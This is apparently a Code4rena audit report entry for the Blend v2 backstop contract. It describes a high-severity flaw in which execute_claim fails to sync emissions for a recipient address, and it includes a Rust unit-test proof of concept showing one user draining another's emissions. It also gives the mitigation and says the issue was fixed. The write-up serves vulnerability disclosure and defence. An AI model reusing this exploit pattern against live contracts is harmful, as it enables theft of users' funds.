---
tags:
  - lang/rust
  - lang/solidity
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - sector/farm
  - sector/lending
  - sector/nft-lending
protocol: "[[Blend]]"
auditors:
  - "[[oakcobalt]]"
report: "https://code4rena.com/reports/2025-02-blend-v2-audit-certora-formal-verification"
genome:
  - "[[lockup]]"
  - "[[permanent]]"
  - "[[direct-drain]]"
  - "[[timestamp-dependence]]"
---
# [H-02] User can steal other users’ emissions due to vulnerable claim implementation

- id: 62062
- impact: HIGH
- protocol: [[Blend]]
- reporter: oakcobalt (Code4rena)
- source: https://code4rena.com/reports/2025-02-blend-v2-audit-certora-formal-verification

## Summary


The bug report is about a missing function in the `backstop::emissions::execute_claim` code, which can lead to a user stealing the emissions of other users. This can happen when a user deposits to the backstop and the `update_emissions` function is not called before updating the user's balance. This causes a synchronization conflict and can result in the inflation of a user's emissions. To exploit this bug, a user can claim emissions and deposit them into an address they control, which has no user balance. They can then immediately claim emissions again, stealing emissions from other users. This can be repeated with multiple controlled addresses. The recommended mitigation step is to add a logic that calls the `update_emissions` function for the `to` address before adding shares. The issue has been addressed by removing the `to` address, making the exploit no longer possible.

## Details



<https://github.com/code-423n4/2025-02-blend/blob/f23b3260763488f365ef6a95bfb139c95b0ed0f9/blend-contracts-v2/backstop/src/contract.rs# L1>

### Finding description

`backstop::emissions::execute_claim` is missing `update_emissions` for `to` address which allows a user stealing other users’ emissions.

### Proof of Concept

When a user deposit to backstop, `update_emissions` needs to be [called atomically before `user_balance` update](https://github.com/code-423n4/2025-02-blend/blob/f23b3260763488f365ef6a95bfb139c95b0ed0f9/blend-contracts-v2/backstop/src/backstop/deposit.rs# L17) to ensure user emissions are initialized correctly; e.g. if user has zero share, their emission data should be [intiralized first to current index](https://github.com/code-423n4/2025-02-blend/blob/f23b3260763488f365ef6a95bfb139c95b0ed0f9/blend-contracts-v2/backstop/src/emissions/distributor.rs# L122-L124).

However, in `execute_claim`, when `from ≠ to`, the exchanged backstop LPs are deposited to `to` address but `update_emissions` is missing. This means `to`’s balance is updated without syncing/initializing their emission data first before the balance change. This introduces a state synchronization conflict.
`to`’s emissions will be inflated.
```

pub fn execute_claim(e: &Env, from: &Address, pool_addresses: &Vec<Address>, to: &Address) -> i128 {
...
            for pool_id in pool_addresses.iter() {
                        let claim_amount = claims.get(pool_id.clone()).unwrap();
            let deposit_amount = lp_tokens_out
                .fixed_mul_floor(claim_amount, claimed)
                .unwrap();
            let mut pool_balance = storage::get_pool_balance(e, &pool_id);
            let mut user_balance = storage::get_user_balance(e, &pool_id, to);

            // Deposit LP tokens into pool backstop
            let to_mint = pool_balance.convert_to_shares(deposit_amount);
            pool_balance.deposit(deposit_amount, to_mint);
            //@audit `to`'s balance is updated without update_emissions. `to`'s emission data is not synced/ initialized.
|>          user_balance.add_shares(to_mint);

            storage::set_pool_balance(e, &pool_id, &pool_balance);
            storage::set_user_balance(e, &pool_id, to, &user_balance);

            BackstopEvents::deposit(e, pool_id, to.clone(), deposit_amount, to_mint);
        }
        ...
```

<https://github.com/code-423n4/2025-02-blend/blob/f23b3260763488f365ef6a95bfb139c95b0ed0f9/blend-contracts-v2/backstop/src/emissions/claim.rs# L66>

Flows: `backstop::claim -> emissions::execute_claim`

One exploit scenarios is a user can `execute_claim` into an address of their control and such address has no user balance.

### Coded PoC

Suppose userA and userB have deposited equal share in backstop module. userA controls addressC which has no user emission data.

1. userA claim emissions and deposit to addressC.
2. userA immediately claim emissions again through addressC. addressC claimed historical emissions even though it has 0 share prior to userA’s first claim.
3. userB tries to claim their emissions. tx revert due to insufficient funds.
   userA stole emissions from userB successfully.

See added unit test `test_user_steal_emissions()` in `backstop/src/emissions/claim.rs`. Run test: `cargo test test_user_steal_emissions`.
```

    #[test]
    #[should_panic(expected = "Error(Contract, # 10)")]
    fn test_user_steal_emissions() {
        let e = Env::default();
        e.mock_all_auths();
        let block_timestamp = 1500000000 + 12345;
        e.ledger().set(LedgerInfo {
            timestamp: block_timestamp,
            protocol_version: 22,
            sequence_number: 0,
            network_id: Default::default(),
            base_reserve: 10,
            min_temp_entry_ttl: 10,
            min_persistent_entry_ttl: 10,
            max_entry_ttl: 3110400,
        });
        e.cost_estimate().budget().reset_unlimited();

        let backstop_address = create_backstop(&e);
        let pool_1_id = Address::generate(&e);
        let pool_2_id = Address::generate(&e);
        let bombadil = Address::generate(&e);
        let samwise = Address::generate(&e); // userA
        let samwiseC = Address::generate(&e); // userA controlled
        let frodo = Address::generate(&e); //userB

        let (blnd_address, blnd_token_client) = create_blnd_token(&e, &backstop_address, &bombadil);
        let (usdc_address, _) = create_usdc_token(&e, &backstop_address, &bombadil);

        // set total emissions to backstop contract
        blnd_token_client.mint(&backstop_address, &152_6310272);
        let (lp_address, lp_client) =
            create_comet_lp_pool(&e, &bombadil, &blnd_address, &usdc_address);

        let backstop_1_emissions_data = BackstopEmissionData {
            expiration: 1500000000 + 7 * 24 * 60 * 60,
            eps: 0_10000000000000,
            index: 222220000000,
            last_time: 1500000000,
        };
        let user_1_emissions_data = UserEmissionData {
            index: 111110000000,
            accrued: 1_2345678,
        };
        e.as_contract(&backstop_address, || {
            storage::set_backstop_emis_data(&e, &pool_1_id, &backstop_1_emissions_data);
            storage::set_user_emis_data(&e, &pool_1_id, &samwise, &user_1_emissions_data);
            storage::set_user_emis_data(&e, &pool_1_id, &frodo, &user_1_emissions_data);
            storage::set_backstop_token(&e, &lp_address);
            storage::set_blnd_token(&e, &blnd_address);
            storage::set_rz_emission_index(&e, &1_00000000000000);
            storage::set_rz_emis_data(
                &e,
                &pool_1_id,
                &RzEmissionData {
                    index: 0,
                    accrued: 0,
                },
            );
            storage::set_pool_balance(
                &e,
                &pool_1_id,
                &PoolBalance {
                    shares: 150_0000000,
                    tokens: 200_0000000,
                    q4w: 2_0000000,
                },
            );
            // samwise has 9_0000000 shares
            storage::set_user_balance(
                &e,
                &pool_1_id,
                &samwise,
                &UserBalance {
                    shares: 9_0000000,
                    q4w: vec![&e],
                },
            );
            // frodo has 9_0000000 shares
            storage::set_user_balance(
                &e,
                &pool_1_id,
                &frodo,
                &UserBalance {
                    shares: 9_0000000,
                    q4w: vec![&e],
                },
            );
            //samwise claim to samwiseC (receives blend 76_3155136 converted into backstop LP deposited for samwiseC)
            let result1 = execute_claim(&e, &samwise, &vec![&e, pool_1_id.clone()], &samwiseC);
            assert_eq!(result1, 76_3155136);
            //samwise immediately claim from samwiseC,
            let result2 = execute_claim(&e, &samwiseC, &vec![&e, pool_1_id.clone()], &samwiseC);
            assert_eq!(result2, 37_8984270); //samwiseC claims emissions without accumulation, stealing frodo's emissions.

            execute_claim(&e, &frodo, &vec![&e, pool_1_id.clone()], &frodo); //frodo's claim will panic due to backstop doesn't have enough emissions to send to comet pool. panic with balanceError.
        })
    }
```

Test results:
```

     Running unittests src/lib.rs (target/debug/deps/backstop-70626b884282a67b)

running 1 test
test emissions::claim::tests::test_user_steal_emissions - should panic ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 103 filtered out; finished in 0.24s
```

### Impact

When `from != to`, `to` can claim part of other user’s emissions. A user can steal emissions by inputting a `to` address new to the backstop module. The attack can be repeated with multiple user controlled addresses.

### Recommended mitigation steps

In execute*claim, add a logic when `from ≠ to` invoke `update*emissions`for`to`before adding shares to`to`.

**markus\_pl10 (Script3) confirmed**

**Comments from the Script3 team:**

> While this finding was excluded from the scope of the mitigation review, it was addressed [here](https://github.com/blend-capital/blend-contracts-v2/commit/77373e35f8fd91408df9a3f79d1e4443c13e8f4a# diff-4e48ac9f3873ec0958b7ca43ff935ccb7c9b2b391c088739b2ad751385e8f0c9) by removing the `to` address, which ensures that the exploit is no longer possible.

---
